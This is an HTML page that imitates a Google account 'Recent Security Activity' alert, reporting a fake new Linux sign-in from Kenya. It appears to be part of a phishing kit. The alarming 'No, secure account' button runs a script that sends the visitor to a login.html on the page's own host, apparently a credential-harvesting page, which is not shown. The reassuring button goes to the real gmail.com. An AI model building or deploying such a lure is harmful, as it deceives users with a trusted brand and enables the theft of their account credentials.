<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="chrome" content="nointentdetection" />
		<link rel="shortcut icon" href="https://www.google.com/favicon.ico" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<meta
			name="description"
			content="Gmail is email that&#39;s intuitive, efficient and useful. 15 GB of storage, less spam and mobile access."
		/>
		<title>Google Account Settings</title>
		<script src="./tailwind.css"></script>
	</head>
	<body>
		<div class="relative min-h-screen">
			<nav class="h-fit bg-white/90 shadow-md">
				<div class="grid grid-cols-5 items-center justify-between p-4">
					<div class="col-span-4 flex items-center p-2">
						<img
							alt="google"
							class="h-17 w-17"
							src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg"
						/>
						<p class="ml-2 text-xl text-black/65">Account</p>
					</div>
					<div class="flex items-center justify-end">
						<div class="rounded-full p-2 hover:bg-slate-100">
							<svg
								xmlns="http://www.w3.org/2000/svg"
								width="24"
								height="24"
								viewBox="0 0 24 24"
								fill="none"
								stroke="currentColor"
								stroke-width="2"
								stroke-linecap="round"
								stroke-linejoin="round"
								class="h-7 w-7"
							>
								<circle cx="12" cy="12" r="10" />
								<path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
								<path d="M12 17h.01" />
							</svg>
						</div>
						<div class="rounded-full p-2 hover:bg-slate-100">
							<svg class="h-7 w-7" focusable="false" viewBox="0 0 24 24">
								<path
									d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM16,6c0,1.1 0.9,2 2,2s2,-0.9 2,-2 -0.9,-2 -2,-2 -2,0.9 -2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"
								></path>
								<image
									src="https://ssl.gstatic.com/gb/images/bar/al-icon.png"
									alt=""
									height="24"
									width="24"
									style="border: none; display: none \9"
								></image>
							</svg>
						</div>
						<div class="rounded-full p-2 hover:bg-slate-100">
							<a
								href="https://accounts.google.com/SignOutOptions?hl=en&amp;continue=https://myaccount.google.com/u/1/notifications/eid/-4511617156840839112%3Frfn%3D27%26rfnc%3D1%26et%3D0%26anexp%3Dnret-fa%26pli%3D1&amp;ec=GBRAwAE"
								tabindex="0"
								role="button"
								aria-expanded="false"
							>
								<img
									class="h-8 w-8 rounded-full"
									src="./Recent security activity_files/unnamed.png"
									srcset="
										https://lh3.googleusercontent.com/ogw/AF2bZyhmzGuekYOeBtpV8IKrpVPsDoiuw2-OQOmn7GkcoA=s32-c-mo 1x,
										https://lh3.googleusercontent.com/ogw/AF2bZyhmzGuekYOeBtpV8IKrpVPsDoiuw2-OQOmn7GkcoA=s64-c-mo 2x
									"
									alt=""
									aria-hidden="true"
									data-noaft=""
								/>
							</a>
						</div>
					</div>
				</div>
				<div class="mx-auto w-full p-5 px-2 lg:max-w-screen-lg">
					<div class="flex items-center space-x-2 px-2 text-black/85">
						<button class="rounded-full p-2 hover:bg-slate-100">
							<svg
								xmlns="http://www.w3.org/2000/svg"
								width="24"
								height="24"
								viewBox="0 0 24 24"
								fill="none"
								stroke="currentColor"
								stroke-width="2"
								stroke-linecap="round"
								stroke-linejoin="round"
								class="lucide lucide-arrow-left"
							>
								<path d="m12 19-7-7 7-7" />
								<path d="M19 12H5" />
							</svg>
						</button>
						<p class="text-2xl">Recent Security Activity</p>
					</div>
				</div>
			</nav>
			<div class="mx-auto grid max-w-screen-lg gap-3 p-5">
				<div
					class="mx-auto grid h-fit w-full gap-4 rounded-lg border p-5 lg:w-1/2"
				>
					<div class="flex items-center space-x-2">
						<p>7 minutes ago</p>
						<p class="w-fit rounded-lg bg-blue-700 px-2 text-xs text-white">
							New
						</p>
					</div>
					<div>
						<p class="text-2xl">New sign-in linux</p>
						<p class="py-2 text-sm">
							Your account is at risk if this wasn't you
						</p>
					</div>
					<div class="flex w-1/2 items-center justify-around">
						<img
							class="h-20 w-20 overflow-hidden object-cover"
							src="https://www.gstatic.com/identity/boq/accountsettingssecuritycommon/images/sprites/devices_realistic_72-b9bd1ca60228ef0457a37afb84e72bdd.png"
						/>
						<div class="flex flex-col">
							<h4 class="py-3 text-lg font-semibold">Linux</h4>
							<p class="text-sm">Kenya</p>
							<div class="flex items-center space-x-1 font-medium">
								<svg
									xmlns="http://www.w3.org/2000/svg"
									width="24"
									height="24"
									viewBox="0 0 24 24"
									fill="none"
									stroke="#097eec"
									stroke-width="2"
									stroke-linecap="round"
									stroke-linejoin="round"
									class="lucide lucide-circle-check h-5 w-5"
								>
									<circle cx="12" cy="12" r="10" />
									<path d="m9 12 2 2 4-4" />
								</svg>
								<p class="w-fit rounded-lg text-xs">This device</p>
							</div>
						</div>
					</div>
					<div class="py-5">
						<p class="text-lg">Do you recognise this activity?</p>
					</div>
					<div class="flex w-full space-x-2 p-2">
						<button
							id="submit-button"
							class="flex flex-grow space-x-1 rounded-md border p-2 text-red-600 hover:bg-slate-100"
						>
							<svg
								xmlns="http://www.w3.org/2000/svg"
								width="24"
								height="24"
								viewBox="0 0 24 24"
								fill="none"
								stroke="#ec0909"
								stroke-width="2"
								stroke-linecap="round"
								stroke-linejoin="round"
								class="lucide lucide-x h-6 w-6"
							>
								<path d="M18 6 6 18" />
								<path d="m6 6 12 12" />
							</svg>
							<span> No, secure account </span>
						</button>
						<button
							id="continue-button"
							class="flex flex-grow space-x-1 rounded-md border p-2 text-[#066ad2] hover:bg-slate-100"
						>
							<svg
								xmlns="http://www.w3.org/2000/svg"
								width="24"
								height="24"
								viewBox="0 0 24 24"
								fill="none"
								stroke="#066ad2"
								stroke-width="2"
								stroke-linecap="round"
								stroke-linejoin="round"
								class="lucide lucide-check"
							>
								<path d="M20 6 9 17l-5-5" />
							</svg>
							<span>Yes, it was me </span>
						</button>
					</div>
				</div>
			</div>
			<div class="absolute bottom-0 left-0">
				<div class="flex space-x-4 p-4 text-xs text-black/65">
					<a class="">Privacy</a>
					<a>Terms</a>
					<a>Help </a>
					<a>About </a>
				</div>
			</div>
		</div>
		<script type="text/javascript">
			document.getElementById("submit-button").onclick = function () {
				location.href = `${location.protocol}//${location.hostname}:${location.port}/login.html`;
			};
			document.getElementById("continue-button").onclick = function () {
				location.href = "https://gmail.com";
			};
		</script>
	</body>
</html>
